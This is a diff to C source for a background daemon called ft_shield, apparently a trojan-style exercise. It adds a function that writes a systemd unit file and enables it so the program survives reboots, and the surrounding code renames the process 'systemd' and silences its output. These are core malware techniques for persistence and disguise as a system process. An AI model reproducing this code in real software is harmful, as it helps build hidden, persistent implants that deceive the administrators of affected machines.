@@ -9,6 +9,19 @@ void close_fds() {
     }
 }
 
+void set_persistance() {
+    const char *path = "/etc/systemd/system/ft_shield.service";
+    int fd = sc(SYS_open ,path, O_CREAT | O_RDWR, 0644);
+    if (fd < 0) {
+        perror("open : ");
+        return ;
+    }
+    write(fd, SYSTEMCTL_CONFIG, strlen(SYSTEMCTL_CONFIG));
+
+    system("systemctl daemon-reexec");
+    system("systemctl enable /etc/systemd/system/ft_shield.service");
+}
+
 void reset_signals() {
     for (int sig = SIGHUP; sig < _NSIG; sig++)
         signal(sig, SIG_DFL);
@@ -55,9 +68,9 @@ void create_daemon() {
         exit(EXIT_FAILURE);
     if (pid > 0)
         exit(EXIT_SUCCESS);
-        
     close_fds();
     reset_signals();
+    set_persistance();
     handle_lock(LOCK);
     sc(SYS_prctl, PR_SET_NAME, "systemd\0", NULL, NULL, NULL);
     sc(SYS_umask, 0);
@@ -65,9 +78,10 @@ void create_daemon() {
     int fd = sc(SYS_open, "/dev/null");
     if (fd < 0)
         exit(EXIT_FAILURE);
+        // int log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
     // redirection des flux standards vers /dev/null
-    // int log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
     sc(SYS_dup2, fd, STDIN_FILENO);
     sc(SYS_dup2, fd, STDOUT_FILENO);
     sc(SYS_dup2, fd, STDERR_FILENO);
+
 }
